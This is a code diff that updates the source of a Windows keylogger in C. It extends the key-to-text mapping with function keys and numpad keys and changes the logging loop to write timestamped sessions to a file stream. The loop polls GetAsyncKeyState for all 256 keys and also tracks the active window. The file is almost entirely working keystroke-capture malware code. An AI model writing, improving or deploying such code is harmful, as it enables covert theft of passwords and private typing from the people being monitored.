@@ -40,40 +40,41 @@ void quitHandler(int sig){
         }
     }
 
-    void table(unsigned char key_number)
-    {
-        if((key_number>=0x30)&&(key_number<=0x39)) /* numeri */
-        {
-            sprintf(string,"\r\n%c",key_number);
+    void convert(int keycode) {
+        if((keycode>=0x30)&&(keycode<=0x39)) { /* numbers */
+            sprintf(string,"\r\n%c",keycode); return;
+        }
+
+        if((keycode>=0x41)&&(keycode<=0x5A)) { /* upper/lower case characters */
+            if((GetKeyState(VK_CAPITAL)>0) || (GetKeyState(VK_SHIFT)&8000)) sprintf(string,"\r\n%c",keycode);
+            else sprintf(string,"\r\n%c",keycode+0x20);
             return;
         }
 
-        if((key_number>=0x41)&&(key_number<=0x5A)) /* caratteri maiuscoli/minuscoli */
-        {
-            if((GetKeyState(VK_CAPITAL)>0) || (GetKeyState(VK_SHIFT)&8000)) sprintf(string,"\r\n%c",key_number);
-            else sprintf(string,"\r\n%c",key_number+0x20);
-            return;
-        }
-
-        switch(key_number) /* pulsanti del mouse */
-        {
-            case VK_LBUTTON: sprintf(string,"\r\nMOUSE LEFT");return;
-            case VK_MBUTTON: sprintf(string,"\r\nMOUSE MIDDLE");return;
-            case VK_RBUTTON: sprintf(string,"\r\nMOUSE RIGHT");return;
-        }
-
-        switch(key_number) /* tasti speciali */
-        {
-            case VK_ESCAPE: sprintf(string,"\r\nESC");return;
-            case VK_NEXT: sprintf(string,"\r\nPAGDOWN");return;
-            case VK_END: sprintf(string,"\r\nEND");return;
-            case VK_PRIOR: sprintf(string,"\r\nPAGUP");return;
-            case VK_HOME: sprintf(string,"\r\nHOME");return;
+        switch(keycode) {
             case VK_LEFT: sprintf(string,"\r\nLEFT");return;
             case VK_UP: sprintf(string,"\r\nUP");return;
             case VK_RIGHT: sprintf(string,"\r\nRIGHT");return;
             case VK_DOWN: sprintf(string,"\r\nDOWN");return;
-            case VK_INSERT: sprintf(string,"\r\nINS");return;
+        }
+
+        switch(keycode) {
+            case VK_F1: sprintf(string,"\r\nF1");return;
+            case VK_F2: sprintf(string,"\r\nF2");return;
+            case VK_F3: sprintf(string,"\r\nF3");return;
+            case VK_F4: sprintf(string,"\r\nF4");return;
+            case VK_F5: sprintf(string,"\r\nF5");return;
+            case VK_F6: sprintf(string,"\r\nF6");return;
+            case VK_F7: sprintf(string,"\r\nF7");return;
+            case VK_F8: sprintf(string,"\r\nF8");return;
+            case VK_F9: sprintf(string,"\r\nF9");return;
+            case VK_F10: sprintf(string,"\r\nF10");return;
+            case VK_F11: sprintf(string,"\r\nF11");return;
+            case VK_F12: sprintf(string,"\r\nF12");return;
+        }
+
+        switch(keycode) { /* special characters */
+            case VK_ESCAPE: sprintf(string,"\r\nESC");return;
             case VK_DELETE: sprintf(string,"\r\nDEL");return;
             case VK_SPACE: sprintf(string,"\r\nSPACE");return;
             case VK_RETURN: sprintf(string,"\r\nENTER");return;
@@ -83,33 +84,54 @@ void quitHandler(int sig){
             case VK_LCONTROL: sprintf(string,"\r\nLEFTCONTROL");return;
             case VK_RCONTROL: sprintf(string,"\r\nRIGHTCONTROL");return;
             case VK_TAB: sprintf(string,"\r\nTAB");return;
+            case VK_SUBTRACT: sprintf(string,"\r\nMINUS");return;
+            case VK_ADD: sprintf(string,"\r\nPLUS");return;
+            case VK_NUMLOCK: sprintf(string,"\r\nNUMLOCK");return;
+            case VK_SCROLL: sprintf(string,"\r\nSCROLLLOCK");return;
         }
 
-        sprintf(string,"\r\nUNRECOGNIZED");
-        return;
+        sprintf(string,"\r\nUNRECOGNIZED: %d", keycode); return;
     }
 
-    void keylogger(int keyboard, int writeout) {
-        FILE* dump;
+    void keylogger(int keyboard, FILE* writeout) {
         signal(SIGINT, quitHandler);
         signal(SIGTERM, quitHandler);
+
+        time_t t = time(NULL);
+        struct tm tm = *localtime(&t);
+
+        fprintf(writeout,
+                "\nLOGGING SESSION START: %d-%02d-%02d %02d:%02d:%02d "
+                "\nPLATFORM: WINDOWS\nCODEC: unicode",
+                tm.tm_year + 1900,
+                tm.tm_mon + 1,
+                tm.tm_mday,
+                tm.tm_hour,
+                tm.tm_min,
+                tm.tm_sec);
 
         while(running) {
             for (int i = 0; i < 256; i++) {
                 char key = GetAsyncKeyState(i);
                 if (key > 0) {
-                    table(i);
-                    if(dump = fopen("log.txt","ab+")) {
-                        printf("File aperto!");
-                    }
-                    fprintf(dump, string);
-                    fclose(dump);
+                    convert(i);
+                    fprintf(writeout, string);
                     break;
                 }
             }
             searchActiveWindow();
             Sleep(10); /* previene la saturazione della CPU */
         }
+
+        t = time(NULL);
+        tm = *localtime(&t);
+        fprintf(writeout, "\nLOGGING SESSION END: %d-%02d-%02d %02d:%02d:%02d",
+                tm.tm_year + 1900,
+                tm.tm_mon + 1,
+                tm.tm_mday,
+                tm.tm_hour,
+                tm.tm_min,
+                tm.tm_sec);
     }
 #endif
 
